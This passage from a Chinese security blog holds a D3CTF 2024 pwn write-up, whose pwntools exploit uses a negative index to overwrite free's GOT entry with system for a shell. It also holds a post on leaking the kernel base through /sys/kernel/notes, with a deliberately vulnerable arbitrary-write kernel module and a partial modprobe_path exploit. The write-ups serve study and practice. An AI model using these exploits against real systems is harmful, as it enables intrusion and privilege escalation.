class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_4011F2();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = sub_4011F2();</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>));</span><br><span class="line">      *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v6) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">6425</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2064</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = sub_4011F2();</span><br><span class="line">      sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v7 + <span class="number">1</span>), *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_4040A0 + <span class="number">4</span> * v7));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2064</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">276</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_4011F2();</span><br><span class="line">        v8 = sub_4011F2();</span><br><span class="line">        *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v4) = v8;</span><br><span class="line">        *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>((<span class="type">int</span>)v8);</span><br><span class="line">        sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>), v8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1300</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        v5 = sub_4011F2();</span><br><span class="line">        <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v5 + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启的保护：  </p><img src="/2024/04/29/d3ctf2024/4.png" class="" title="我的图图呢">  <p>这题第一眼看上去就感觉是经典的菜单题，但是看了办法没有发现堆上的漏洞，后面发现在输入堆块索引时程序并没有对输入的索引进行检测，导致可以使用负索引。由于没有开启 <code>PIE</code> 且 <code>RELRO</code> 状态为 <code>Partial RELRO</code>，所以我选择劫持 <code>free</code> 的 <code>got</code> 表为 <code>system</code> 然后释放掉一个内容为 <code>sh</code> 的堆块来实现 <code>getshell</code><br>这题的一个难点在于存储堆块指针的地址都是以 <code>8</code> 结尾，导致我们不好泄露地址，经过长时间的查找我找到了可以利用的地址  </p><img src="/2024/04/29/d3ctf2024/5.png" class="" title="我的图图呢">  <p>所以我选择以这里来泄露 <code>libc</code> 的地址并作为跳板来实现修改 <code>free</code> 的 <code>got</code> 表<br>exp：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.103.122.127&#x27;</span>,<span class="number">32244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;276&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;6425&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1300&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2064&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">got = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">show(-<span class="number">1460</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">1918624</span></span><br><span class="line">log.success(<span class="string">f&#x27;libc_base:<span class="subst">&#123;libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x0000000000029419</span>+libc_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000fd76d</span>+libc_base</span><br><span class="line">ret = libc_base + <span class="number">0x00000000000275f2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x10</span>)+p64(got)</span><br><span class="line">edit(-<span class="number">1460</span>,payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(-<span class="number">2</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>去年的 <code>D3CTF</code> 是我第一次和校队组队参加比赛，当时我的 <code>pwn</code> 水平还停留在栈溢出阶段，完全的被这一些题目给震撼到了。今年再次参加 <code>D3CTF</code>，发现题目能看懂了，花点时间题目能做出来了，看来这一年的努力还是有那么一丢丢作用的，不过还是处于新手阶段，太弱了，哎。比赛期间真的太忙太多事情了，导致没有什么时间做题。<code>qemu</code> 逃逸找到漏洞后发现已经给 <code>xtx</code> 师傅做出来了呜呜呜（太强拉  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>When ELF notes reveal too much</title>
      <link href="/2024/04/17/notes/"/>
      <url>/2024/04/17/notes/</url>
      
        <content type="html"><![CDATA[<p>通常我们对内核的攻击都是基于知道内核各种地址的前提下进行的，为了加大攻击内核的难度， <code>kaslr</code> 由此而生，但内核会很容易泄露有关其位置的信息，如大量内核代码乐于在 <code>printk()</code> 调用中打印出内核指针值。<br>在 大量工作 之后，通过修复内核代码来使用针对指针的特殊格式化指令，并在未设置 <code>kptr_restrict</code> 的情况下拒绝将实际指针值输出到日志中，从而基本解决了这个问题。根据需要还修改了各种 <code>/proc</code> 和 <code>sysfs</code> 文件。随着时间的推移，要想了解特定系统上的内核位置就变得更加困难了，但依然有漏网之鱼可以为我们提供内核的基址<br>这里的主角是 <code>/sys/kernel/notes</code> ，在谷歌上找到的十分简略的描述：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">What:/sys/kernel/notes</span><br><span class="line">Date:July 2009</span><br><span class="line">Contact:&lt;linux-kernel@vger.kernel.org&gt;</span><br><span class="line">Description:The /sys/kernel/notes file contains the binary representation</span><br><span class="line">        of the running vmlinux&#x27;s .notes section.</span><br></pre></td></tr></table></figure><p>该部分是包含内核映像的 <code>ELF</code> 文件的一部分，包含有关映像本身的有用信息；任何内核代码都可以使用 <code>ELFNOTE()</code> 宏将数据添加到此部分。<br>接下来直接进入实践，环境来自一个 <code>ret2hbp</code> 的 <code>demo</code>  </p><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><p>启动内核后输入 <code>hexdump -C /sys/kernel/notes</code>  </p><img src="/2024/04/17/notes/1.png" class="" title="我的图图呢">  <p>可以看到这里确实有我们想要的内核地址，为了验证这个地址是否正确，我决定用这个地址来求解这一道题目<br>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;linux/printk.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;veritas&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint64_t</span> addr;</span><br><span class="line">        <span class="type">uint64_t</span> val;</span><br><span class="line">    &#125; u;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;u, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(u))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write anything anywhere</span></span><br><span class="line">    <span class="comment">// pr_err(&quot;Arb Write [0x%016llx] = 0x%016llx\n&quot;, u.addr, u.val);</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(u.addr) = u.val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">vuln_fops</span> =</span> &#123;.owner = THIS_MODULE,</span><br><span class="line">                                           .open = <span class="literal">NULL</span>,</span><br><span class="line">                                           .release = <span class="literal">NULL</span>,</span><br><span class="line">                                           .read = <span class="literal">NULL</span>,</span><br><span class="line">                                           .write = <span class="literal">NULL</span>,</span><br><span class="line">                                           .unlocked_ioctl = vuln_ioctl&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_miscdev</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR, .name = <span class="string">&quot;vuln&quot;</span>, .fops = &amp;vuln_fops&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vuln_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module init.\n&quot;</span>);</span><br><span class="line">    misc_register(&amp;vuln_miscdev);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vuln_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    pr_info(<span class="string">&quot;vuln: module exit.\n&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;vuln_miscdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(vuln_init);</span><br><span class="line">module_exit(vuln_exit);</span><br></pre></td></tr></table></figure><p>可以看到我们有无数次任意地址写 <code>8</code> 字节的机会，假设上面泄露出来的地址是正确的，我们可以通过修改 <code>modprobe_path</code> 来获取 <code>flag</code><br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff82e8b920</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> vul;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 